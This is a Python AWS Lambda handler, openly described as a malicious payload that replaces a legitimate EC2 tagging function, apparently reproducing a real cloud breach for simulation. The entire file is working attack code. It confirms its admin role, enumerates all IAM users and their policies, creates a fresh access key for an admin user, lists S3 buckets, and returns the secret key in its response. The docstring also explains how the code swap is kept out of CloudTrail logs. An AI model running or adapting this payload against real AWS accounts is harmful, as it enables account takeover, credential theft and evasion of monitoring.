"""
ec2_init.py -- Malicious Lambda payload (replaces the legitimate EC2 tagger).

This file is named ec2_init.py so that the existing Lambda handler
configuration (ec2_init.lambda_handler) resolves correctly after the
code swap via UpdateFunctionCode -- no handler change needed, which
means one fewer API call visible in CloudTrail.

When invoked, this code runs with the Lambda execution role's permissions
(AdministratorAccess). It:
  1. Confirms its identity (verifies admin role)
  2. Lists all IAM users and their permissions
  3. Creates a new access key for the target admin user
  4. Lists S3 buckets for additional reconnaissance
  5. Returns all results in the Lambda response body

The target admin username is configurable via:
  - The Lambda event payload: {"target_admin_user": "frick"}
  - Falls back to the TARGET_ADMIN_USER environment variable
  - Falls back to "frick" (the default from the real attack)
"""
import os
import json

import boto3


def lambda_handler(event, context):
    """
    Malicious payload injected by the attacker.

    Args:
        event: Lambda event. May contain {"target_admin_user": "<username>"}.
        context: Lambda context object (provides request ID, etc.).

    Returns:
        Dict with statusCode and JSON body containing stolen credentials
        and reconnaissance data.
    """
    results = {}

    # Determine the target admin username
    target_user = (
        event.get("target_admin_user")
        or os.environ.get("TARGET_ADMIN_USER")
        or "frick"
    )

    # Step 1: Confirm identity -- verify we have the admin role
    sts = boto3.client("sts")
    try:
        caller = sts.get_caller_identity()
        results["identity"] = caller["Arn"]
    except Exception as e:
        results["identity_error"] = str(e)

    # Step 2: Enumerate IAM users and their permissions
    iam = boto3.client("iam")
    try:
        users = iam.list_users()
        results["users"] = {}
        for user in users["Users"]:
            uname = user["UserName"]
            try:
                keys = iam.list_access_keys(UserName=uname)
                policies = iam.list_attached_user_policies(UserName=uname)
                groups = iam.list_groups_for_user(UserName=uname)
                results["users"][uname] = {
                    "access_key_count": len(keys["AccessKeyMetadata"]),
                    "policies": [
                        p["PolicyName"]
                        for p in policies["AttachedPolicies"]
                    ],
                    "groups": [
                        g["GroupName"] for g in groups["Groups"]
                    ],
                }
            except Exception as e:
                results["users"][uname] = str(e)
    except Exception as e:
        results["users_error"] = str(e)

    # Step 3: Create new access keys for the target admin user
    try:
        new_key = iam.create_access_key(UserName=target_user)
        results["admin_credentials"] = {
            "AccessKeyId": new_key["AccessKey"]["AccessKeyId"],
            "SecretAccessKey": new_key["AccessKey"]["SecretAccessKey"],
        }
    except Exception as e:
        results["key_creation_error"] = str(e)

    # Step 4: List S3 buckets for additional recon
    s3 = boto3.client("s3")
    try:
        buckets = s3.list_buckets()
        results["buckets"] = [
            b["Name"] for b in buckets["Buckets"][:10]
        ]
    except Exception as e:
        results["s3_error"] = str(e)

    return {
        "statusCode": 200,
        "body": json.dumps(results, default=str),
    }
